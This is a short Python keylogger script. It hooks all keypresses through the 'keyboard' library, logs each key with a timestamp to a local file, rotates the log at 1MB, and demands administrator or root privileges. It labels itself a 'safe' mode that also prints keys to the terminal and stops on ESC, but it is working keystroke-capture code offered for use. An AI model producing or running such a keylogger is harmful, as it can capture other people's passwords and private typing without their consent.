import keyboard
from datetime import datetime
import os
import sys

LOG_FILE = "keystrokes.log"
MAX_LOG_SIZE = 1024 * 1024  # 1MB


def on_key_press(event):
    """Logs each keypress with a timestamp safely."""
    try:
        key = event.name
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # Represent special keys clearly
        if len(key) > 1:
            key = f"[{key.upper()}]"

        # Print to terminal for debug visibility
        print(f"{timestamp} - {key}")

        # Append to log file
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{timestamp} - {key}\n")

        # Rotate if log is too big
        if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > MAX_LOG_SIZE:
            rotate_log()

    except Exception as e:
        print(f"[ERROR] Failed to log key: {e}")


def rotate_log():
    """Rotates log file when size exceeds limit."""
    try:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        new_name = f"keystrokes_{timestamp}.log"
        os.rename(LOG_FILE, new_name)
        print(f"[INFO] Log rotated to {new_name}")
    except Exception as e:
        print(f"[ERROR] Failed to rotate log: {e}")


def has_admin_rights():
    """Checks for administrator/root permissions."""
    try:
        if os.name == 'nt':
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin()
        else:
            return os.geteuid() == 0
    except:
        return False


def main():
    if not has_admin_rights():
        print("❌ ERROR: This script must be run with administrator/root privileges!")
        print("➡️  Windows: Right-click and 'Run as administrator'.")
        print("➡️  macOS/Linux: Use `sudo python3 keylogger.py`")
        sys.exit(1)

    print("""
    SAFE KEYLOGGER MODE
    --------------------
    ✅ Logging keys to: keystrokes.log
    🛡️  Safe mode: Keys also printed to terminal.
    📦 Log will auto-rotate after 1MB.
    🔴 Press ESC to stop.
    """)

    # Clear or create log file
    open(LOG_FILE, 'w').close()

    # Start logging
    keyboard.on_press(on_key_press)

    # Wait for ESC key
    keyboard.wait('esc')

    # Cleanup
    keyboard.unhook_all()
    print("[INFO] Keylogger stopped. Log saved.")


if __name__ == "__main__":
    main()
